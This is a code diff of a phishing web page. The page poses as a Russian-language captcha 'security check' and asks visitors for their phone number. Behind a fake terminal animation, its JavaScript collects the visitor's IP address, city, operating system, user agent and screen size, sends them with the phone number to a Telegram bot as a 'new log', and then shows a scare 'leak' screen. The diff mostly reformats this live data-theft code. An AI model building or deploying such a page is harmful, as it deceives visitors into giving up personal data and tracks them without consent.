@@ -12,18 +12,20 @@
         .danger-ui { border: 2px solid red; padding: 20px; margin: 20px auto; max-width: 600px; background: rgba(255, 0, 0, 0.1); }
         .red-text { color: red; text-align: center; font-weight: bold; font-size: 22px; }
         hr { border: 0; border-top: 2px solid red; margin: 15px 0; }
+        input { padding: 10px; border: 1px solid #007bff; border-radius: 5px; width: 220px; text-align: center; font-size: 16px; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div id="terminal"></div>
 
     <div id="captcha-box">
-    <img src="https://www.google.com" width="120">
-    <h2>Проверка безопасности</h2>
-    <p style="font-size: 13px; color: #555;">Введите номер телефона для получения кода:</p>
-    <input type="tel" id="user-phone" placeholder="+998 __ ___ __ __" style="padding: 10px; margin-bottom: 10px; border: 1px solid #007bff; border-radius: 5px; width: 220px; text-align: center; font-size: 16px;">
-    <button class="btn-verify" onclick="startProcess()">Я не робот</button>
-</div>
+        <!-- Исправлена картинка -->
+        <img src="https://www.google.com" width="120">
+        <h2>Проверка безопасности</h2>
+        <p style="font-size: 13px; color: #555;">Введите номер телефона для получения кода:</p>
+        <input type="tel" id="user-phone" placeholder="+998 __ ___ __ __">
+        <button class="btn-verify" onclick="startProcess()">Я не робот</button>
+    </div>
 
     <div id="leak-box">
         <div class="danger-ui">
@@ -42,6 +44,7 @@
         const chat_id = "-1003861311533";
 
         async function startProcess() {
+ 
             document.getElementById('captcha-box').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
@@ -62,66 +65,57 @@
                 p.innerText = line;
                 term.appendChild(p);
                 window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 150)); 
+                await new Promise(r => setTimeout(r, 100)); 
             }
  
             await getTripleData();
         }
 
-                async function getTripleData() {
-    let ip = "Не определен";
-    let city = "Неизвестно";
-    
- 
-    const phoneInput = document.getElementById('user-phone').value || "Не указан";
+        async function getTripleData() {
+            let ip = "Не определен";
+            let city = "Неизвестно";
+            
+            const phone = document.getElementById('user-phone').value || "Не указан";
+            const realOS = navigator.platform; 
+            const realUA = navigator.userAgent;
 
-  
-    const realOS = navigator.platform; 
-    const realUA = navigator.userAgent;
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
+            try {
+              
+                const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
+                if (ipRes) {
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                }
 
-    try {
-   
-        const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
-        if (ipRes) {
-            const ipData = await ipRes.json();
-            ip = ipData.ip;
-        }
+                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
+                if (geoRes) {
+                    const geoData = await geoRes.json();
+                    city = geoData.city ? `${geoData.city}, ${geoData.country_name}` : "Неизвестно";
+                }
 
-     
-        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
-        if (geoRes) {
-            const geoData = await geoRes.json();
-            city = geoData.city ? `${geoData.city}, ${geoData.country_name}` : "Неизвестно";
-        }
+                document.getElementById('user-ip').innerText = ip;
+                document.getElementById('user-geo').innerText = city;
+                document.getElementById('user-os').innerText = realOS;
 
-   
-        document.getElementById('user-ip').innerText = ip;
-        document.getElementById('user-geo').innerText = city;
-        document.getElementById('user-os').innerText = realOS;
-
-      
-        const msg = `🔥 НОВЫЙ ЛОГ!
-📱 НОМЕР: ${phoneInput}
+                const msg = `🔥 НОВЫЙ ЛОГ!
+📱 НОМЕР: ${phone}
 📍 IP: ${ip}
 🌍 ГОРОД: ${city}
 💻 ОС: ${realOS}
-🖥 ЭКРАН: ${screenRes}
-🌐 ТЕХ. ИНФА: ${realUA}`;
+🖥 ЭКРАН: ${window.screen.width}x${window.screen.height}
+🌐 ИНФО: ${realUA}`;
 
-  
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
-            .catch(e => console.log("Блокировка ТГ"));
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
+                    .catch(e => console.log("ТГ заблокирован прокси"));
 
-    } catch (e) {
-        console.log("Ошибка сбора:", e);
-    }
+            } catch (e) {
+                console.log("Ошибка:", e);
+            }
 
-    setTimeout(() => {
-        document.getElementById('terminal').style.display = 'none';
-        document.getElementById('leak-box').style.display = 'block';
-    }, 500);
-}
+            setTimeout(() => {
+                document.getElementById('terminal').style.display = 'none';
+                document.getElementById('leak-box').style.display = 'block';
+            }, 500);
         }
     </script>
 </body>
